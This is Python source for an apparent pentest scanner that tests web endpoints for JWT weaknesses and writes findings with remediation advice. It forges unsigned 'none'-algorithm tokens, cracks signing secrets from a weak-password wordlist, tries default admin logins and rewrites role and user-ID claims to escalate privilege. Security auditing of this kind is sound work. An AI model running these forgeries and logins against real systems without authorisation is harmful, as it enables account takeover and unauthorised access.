"""
JWT Security Testing Scanner
Tests for common JWT vulnerabilities including algorithm confusion, weak secrets, and claims manipulation
"""

import jwt
import json
import base64
import hashlib
import asyncio
from typing import List, Optional, Dict, Any
from datetime import datetime, timedelta
import logging

from app.models.scan import Vulnerability, SeverityLevel, VulnerabilityCategory
from app.http.client import PentestHTTPClient

logger = logging.getLogger(__name__)


class JWTSecurityScanner:
    """Scanner for JWT authentication vulnerabilities"""

    # Common weak JWT secrets to test
    WEAK_SECRETS = [
        "secret", "Secret", "SECRET",
        "password", "Password", "PASSWORD",
        "jwt", "JWT", "key", "KEY",
        "12345", "123456", "password123",
        "qwerty", "admin", "root",
        "test", "demo", "default",
        "your-256-bit-secret", "your-secret-key",
        "changeme", "change-me", "mysecret"
    ]

    def __init__(self, client: PentestHTTPClient, scan_depth: str = "balanced", progress_callback=None):
        self.client = client
        self.scan_depth = scan_depth
        self.progress_callback = progress_callback
        self.discovered_jwts: List[str] = []

        # Adjust depth
        if scan_depth == "quick":
            self.max_secrets_to_test = 5
            self.test_algorithm_confusion = True
            self.test_claims_manipulation = False
        elif scan_depth == "balanced":
            self.max_secrets_to_test = 15
            self.test_algorithm_confusion = True
            self.test_claims_manipulation = True
        else:  # deep
            self.max_secrets_to_test = len(self.WEAK_SECRETS)
            self.test_algorithm_confusion = True
            self.test_claims_manipulation = True

    async def scan(self, endpoints: List[str]) -> List[Vulnerability]:
        """Scan for JWT vulnerabilities"""
        vulnerabilities = []

        if self.progress_callback:
            await self.progress_callback(f"🔐 Starting JWT Security Testing on {len(endpoints)} endpoints...")

        # Step 1: Discover JWT tokens in responses
        jwt_endpoints = await self._discover_jwt_tokens(endpoints)

        if not jwt_endpoints:
            if self.progress_callback:
                await self.progress_callback("ℹ️  No JWT tokens discovered in responses")
            return vulnerabilities

        if self.progress_callback:
            await self.progress_callback(f"🎯 Found JWT tokens in {len(jwt_endpoints)} endpoints, starting security tests...")

        # Step 2: Test each discovered JWT
        for idx, (endpoint, token) in enumerate(jwt_endpoints.items(), 1):
            if self.progress_callback:
                await self.progress_callback(f"🔍 Testing JWT {idx}/{len(jwt_endpoints)}: {endpoint[:60]}...")

            try:
                # Test for algorithm confusion
                if self.test_algorithm_confusion:
                    vulns = await self._test_algorithm_confusion(endpoint, token)
                    vulnerabilities.extend(vulns)

                # Test for weak secrets
                vulns = await self._test_weak_secrets(endpoint, token)
                vulnerabilities.extend(vulns)

                # Test for missing expiration
                vulns = await self._test_expiration(endpoint, token)
                vulnerabilities.extend(vulns)

                # Test for claims manipulation
                if self.test_claims_manipulation:
                    vulns = await self._test_claims_manipulation(endpoint, token)
                    vulnerabilities.extend(vulns)

                if vulnerabilities and self.progress_callback:
                    await self.progress_callback(f"✅ Found JWT vulnerabilities on {endpoint[:60]}")

            except Exception as e:
                logger.error(f"Error testing JWT on {endpoint}: {e}")
                if self.progress_callback:
                    await self.progress_callback(f"⚠️  Error testing JWT on {endpoint[:60]}: {str(e)[:50]}")

        return vulnerabilities

    async def _discover_jwt_tokens(self, endpoints: List[str]) -> Dict[str, str]:
        """Discover JWT tokens in API responses"""
        jwt_endpoints = {}

        for endpoint in endpoints[:20]:  # Test first 20 endpoints
            try:
                # Try GET request
                response = await self.client.get(endpoint)
                token = self._extract_jwt_from_response(response)

                if token:
                    jwt_endpoints[endpoint] = token
                    logger.info(f"Found JWT in {endpoint}")
                    continue

                # Try POST with common login payloads
                if any(keyword in endpoint.lower() for keyword in ['login', 'auth', 'signin', 'token']):
                    login_payloads = [
                        {"username": "admin", "password": "admin"},
                        {"email": "test@test.com", "password": "test"},
                        {"user": "test", "pass": "test"}
                    ]

                    for payload in login_payloads:
                        response = await self.client.post(endpoint, json=payload)
                        token = self._extract_jwt_from_response(response)
                        if token:
                            jwt_endpoints[endpoint] = token
                            logger.info(f"Found JWT via POST to {endpoint}")
                            break

            except Exception as e:
                logger.debug(f"Could not test {endpoint} for JWT: {e}")

        return jwt_endpoints

    def _extract_jwt_from_response(self, response) -> Optional[str]:
        """Extract JWT token from HTTP response"""
        if not response:
            return None

        # Check response body
        try:
            if hasattr(response, 'text'):
                body = response.text
            else:
                body = str(response.content)

            # Look for JWT pattern (3 base64 segments separated by dots)
            import re
            jwt_pattern = r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
            matches = re.findall(jwt_pattern, body)

            if matches:
                return matches[0]

            # Check Authorization header
            if hasattr(response, 'headers'):
                auth_header = response.headers.get('Authorization', '')
                if 'Bearer ' in auth_header:
                    token = auth_header.replace('Bearer ', '').strip()
                    if token.count('.') == 2:  # Valid JWT structure
                        return token
        except:
            pass

        return None

    async def _test_algorithm_confusion(self, endpoint: str, original_token: str) -> List[Vulnerability]:
        """Test for algorithm confusion vulnerabilities"""
        vulnerabilities = []

        try:
            # Decode without verification to get header and payload
            header = jwt.get_unverified_header(original_token)
            payload = jwt.decode(original_token, options={"verify_signature": False})

            # Test 1: None algorithm
            if header.get('alg') != 'none':
                none_token = self._create_jwt_with_algorithm(payload, 'none', '')
                if await self._test_token_validity(endpoint, none_token):
                    vulnerabilities.append(Vulnerability(
                        id=f"jwt_none_algorithm_{hashlib.md5(endpoint.encode()).hexdigest()[:8]}",
                        title="JWT 'none' Algorithm Accepted",
                        description="The application accepts JWT tokens with 'alg': 'none', allowing attackers to bypass signature verification completely.",
                        severity=SeverityLevel.CRITICAL,
                        category=VulnerabilityCategory.BROKEN_AUTHENTICATION,
                        affected_url=endpoint,
                        affected_parameter="JWT Token",
                        proof_of_concept=f"Created JWT with 'none' algorithm and no signature. Server accepted: {none_token[:100]}...",
                        payload=none_token,
                        remediation="Reject any JWT with 'alg': 'none'. Always verify JWT signatures and enforce a whitelist of acceptable algorithms.",
                        cwe_id="CWE-347",
                        owasp_category="A07:2021 – Identification and Authentication Failures",
                        references=[
                            "https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/",
                            "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/06-Testing_for_JWT"
                        ]
                    ))
                    logger.warning(f"JWT 'none' algorithm accepted on {endpoint}")

            # Test 2: HS256 when expecting RS256 (algorithm confusion)
            if header.get('alg') == 'RS256':
                # This test would require the public key, which we'd need to extract
                # For now, we'll flag it as a potential vulnerability if we can't verify
                logger.info(f"Detected RS256 JWT on {endpoint} - manual testing recommended for algorithm confusion")

        except Exception as e:
            logger.debug(f"Algorithm confusion test failed on {endpoint}: {e}")

        return vulnerabilities

    async def _test_weak_secrets(self, endpoint: str, original_token: str) -> List[Vulnerability]:
        """Test if JWT is signed with a weak secret"""
        vulnerabilities = []

        try:
            payload = jwt.decode(original_token, options={"verify_signature": False})

            # Try to crack the secret
            for secret in self.WEAK_SECRETS[:self.max_secrets_to_test]:
                try:
                    # Try to verify with this secret
                    jwt.decode(original_token, secret, algorithms=["HS256", "HS384", "HS512"])

                    # If we get here, we cracked it!
                    vulnerabilities.append(Vulnerability(
                        id=f"jwt_weak_secret_{hashlib.md5(endpoint.encode()).hexdigest()[:8]}",
                        title="JWT Signed with Weak Secret",
                        description=f"The JWT is signed with a weak, easily guessable secret: '{secret}'. This allows attackers to forge valid tokens and impersonate any user.",
                        severity=SeverityLevel.CRITICAL,
                        category=VulnerabilityCategory.BROKEN_AUTHENTICATION,
                        affected_url=endpoint,
                        affected_parameter="JWT Secret Key",
                        proof_of_concept=f"Successfully verified JWT signature using weak secret: '{secret}'. Can now forge tokens with arbitrary claims.",
                        payload=f"Secret: {secret}",
                        remediation="Use a strong, cryptographically random secret key of at least 256 bits. Store secrets securely (environment variables, key management systems). Rotate keys regularly.",
                        cwe_id="CWE-798",
                        owasp_category="A07:2021 – Identification and Authentication Failures",
                        references=[
                            "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/06-Testing_for_JWT",
                            "https://tools.ietf.org/html/rfc7518#section-3.2"
                        ]
                    ))
                    logger.warning(f"JWT weak secret found on {endpoint}: {secret}")
                    break

                except jwt.InvalidSignatureError:
                    continue
                except Exception:
                    continue

        except Exception as e:
            logger.debug(f"Weak secret test failed on {endpoint}: {e}")

        return vulnerabilities

    async def _test_expiration(self, endpoint: str, original_token: str) -> List[Vulnerability]:
        """Test if JWT has proper expiration"""
        vulnerabilities = []

        try:
            payload = jwt.decode(original_token, options={"verify_signature": False})

            # Check if 'exp' claim exists
            if 'exp' not in payload:
                vulnerabilities.append(Vulnerability(
                    id=f"jwt_no_expiration_{hashlib.md5(endpoint.encode()).hexdigest()[:8]}",
                    title="JWT Without Expiration Claim",
                    description="The JWT does not contain an 'exp' (expiration) claim, meaning the token never expires. This increases the risk if tokens are leaked or stolen.",
                    severity=SeverityLevel.HIGH,
                    category=VulnerabilityCategory.BROKEN_AUTHENTICATION,
                    affected_url=endpoint,
                    affected_parameter="JWT Token",
                    proof_of_concept=f"JWT payload missing 'exp' claim: {json.dumps(payload, indent=2)}",
                    payload=original_token[:100] + "...",
                    remediation="Add an 'exp' claim to all JWTs with a reasonable expiration time (e.g., 15 minutes for access tokens, 7 days for refresh tokens).",
                    cwe_id="CWE-613",
                    owasp_category="A07:2021 – Identification and Authentication Failures",
                    references=[
                        "https://tools.ietf.org/html/rfc7519#section-4.1.4",
                        "https://owasp.org/www-community/vulnerabilities/Insufficient_Session-ID_Length"
                    ]
                ))
                logger.warning(f"JWT without expiration on {endpoint}")
            else:
                # Check if expiration is too long
                exp_timestamp = payload['exp']
                current_time = datetime.utcnow().timestamp()
                time_until_exp = exp_timestamp - current_time

                # If token expires more than 30 days in the future, flag it
                if time_until_exp > (30 * 24 * 3600):
                    days = time_until_exp / (24 * 3600)
                    vulnerabilities.append(Vulnerability(
                        id=f"jwt_long_expiration_{hashlib.md5(endpoint.encode()).hexdigest()[:8]}",
                        title="JWT with Excessively Long Expiration",
                        description=f"The JWT has an expiration time of {days:.1f} days, which is excessively long and increases security risk if the token is compromised.",
                        severity=SeverityLevel.MEDIUM,
                        category=VulnerabilityCategory.BROKEN_AUTHENTICATION,
                        affected_url=endpoint,
                        affected_parameter="JWT exp claim",
                        proof_of_concept=f"JWT expires in {days:.1f} days. Recommended maximum: 1-7 days for refresh tokens, 15-60 minutes for access tokens.",
                        payload=f"exp: {exp_timestamp}",
                        remediation="Reduce JWT expiration time to a more reasonable value. Use short-lived access tokens (15-60 min) with refresh token rotation.",
                        cwe_id="CWE-613",
                        owasp_category="A07:2021 – Identification and Authentication Failures"
                    ))

        except Exception as e:
            logger.debug(f"Expiration test failed on {endpoint}: {e}")

        return vulnerabilities

    async def _test_claims_manipulation(self, endpoint: str, original_token: str) -> List[Vulnerability]:
        """Test if claims can be manipulated without detection"""
        vulnerabilities = []

        try:
            payload = jwt.decode(original_token, options={"verify_signature": False})

            # Look for interesting claims to manipulate
            interesting_claims = ['role', 'admin', 'isAdmin', 'is_admin', 'user_role', 'userId', 'user_id', 'sub', 'email']

            for claim in interesting_claims:
                if claim in payload:
                    # Try to modify the claim
                    modified_payload = payload.copy()

                    if claim in ['admin', 'isAdmin', 'is_admin']:
                        modified_payload[claim] = True
                    elif claim in ['role', 'user_role']:
                        modified_payload[claim] = 'admin'
                    elif claim in ['userId', 'user_id', 'sub']:
                        # Try to change to another user ID
                        try:
                            current_id = int(payload[claim])
                            modified_payload[claim] = 1  # Try admin user
                        except:
                            modified_payload[claim] = 'admin'

                    # Create token without signature (algorithm none)
                    manipulated_token = self._create_jwt_with_algorithm(modified_payload, 'none', '')

                    # Test if server accepts it
                    if await self._test_token_validity(endpoint, manipulated_token):
                        vulnerabilities.append(Vulnerability(
                            id=f"jwt_claims_manipulation_{claim}_{hashlib.md5(endpoint.encode()).hexdigest()[:8]}",
                            title=f"JWT Claims Manipulation - {claim}",
                            description=f"The application accepts modified JWT tokens with manipulated '{claim}' claim, potentially allowing privilege escalation or unauthorized access.",
                            severity=SeverityLevel.CRITICAL,
                            category=VulnerabilityCategory.BROKEN_ACCESS_CONTROL,
                            affected_url=endpoint,
                            affected_parameter=f"JWT {claim} claim",
                            proof_of_concept=f"Modified JWT claim '{claim}' from '{payload.get(claim)}' to '{modified_payload[claim]}' and server accepted the token.",
                            payload=manipulated_token[:100] + "...",
                            remediation="Always verify JWT signature before trusting any claims. Implement server-side authorization checks that don't rely solely on JWT claims.",
                            cwe_id="CWE-639",
                            owasp_category="A01:2021 – Broken Access Control",
                            references=[
                                "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/06-Testing_for_JWT"
                            ]
                        ))
                        logger.warning(f"JWT claims manipulation successful on {endpoint}: {claim}")

        except Exception as e:
            logger.debug(f"Claims manipulation test failed on {endpoint}: {e}")

        return vulnerabilities

    def _create_jwt_with_algorithm(self, payload: dict, algorithm: str, secret: str) -> str:
        """Create a JWT with specified algorithm"""
        if algorithm == 'none':
            # Create JWT without signature
            header = {"typ": "JWT", "alg": "none"}
            header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
            payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
            return f"{header_b64}.{payload_b64}."
        else:
            return jwt.encode(payload, secret, algorithm=algorithm)

    async def _test_token_validity(self, endpoint: str, token: str) -> bool:
        """Test if a token is accepted by the server"""
        try:
            # Try using the token in Authorization header
            headers = {"Authorization": f"Bearer {token}"}
            response = await self.client.get(endpoint, headers=headers)

            # Check if we got a non-401/403 response
            if hasattr(response, 'status_code'):
                return response.status_code not in [401, 403]

            return False

        except Exception as e:
            logger.debug(f"Token validity test failed: {e}")
            return False
